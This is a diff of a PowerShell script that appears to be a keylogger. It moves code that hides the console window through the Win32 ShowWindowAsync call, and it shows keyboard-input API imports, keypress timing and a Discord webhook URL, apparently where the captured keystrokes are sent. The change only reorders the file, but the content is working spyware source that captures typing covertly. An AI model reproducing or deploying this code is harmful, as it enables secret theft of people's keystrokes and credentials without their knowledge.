@@ -4,7 +4,19 @@ if ($dc.Length -lt 120){
 	$dc = ("https://discord.com/api/webhooks/" + "$dc")
 }
 
-# =====================================================================================================================================================
+$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$hwnd = (Get-Process -PID $pid).MainWindowHandle
+if($hwnd -ne [System.IntPtr]::Zero){
+    $Type::ShowWindowAsync($hwnd, 0)
+}
+else{
+    $Host.UI.RawUI.WindowTitle = 'hideme'
+    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+    $hwnd = $Proc.MainWindowHandle
+    $Type::ShowWindowAsync($hwnd, 0)
+}
+
 <#
 Ablaze – On fire; brightly burning with intensity.
 
@@ -36,21 +48,6 @@ Nimble – Quick and light in movement or action.
 
 #>
 
-$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-$hwnd = (Get-Process -PID $pid).MainWindowHandle
-if($hwnd -ne [System.IntPtr]::Zero){
-    $Type::ShowWindowAsync($hwnd, 0)
-}
-else{
-    $Host.UI.RawUI.WindowTitle = 'hideme'
-    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-    $hwnd = $Proc.MainWindowHandle
-    $Type::ShowWindowAsync($hwnd, 0)
-}
-
-$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
-$KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
 # Import DLL Definitions for keyboard inputs
 $API = @'
@@ -65,6 +62,9 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 '@
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 
+
+$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
+$KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
 # Start a continuous loop
 While ($true){
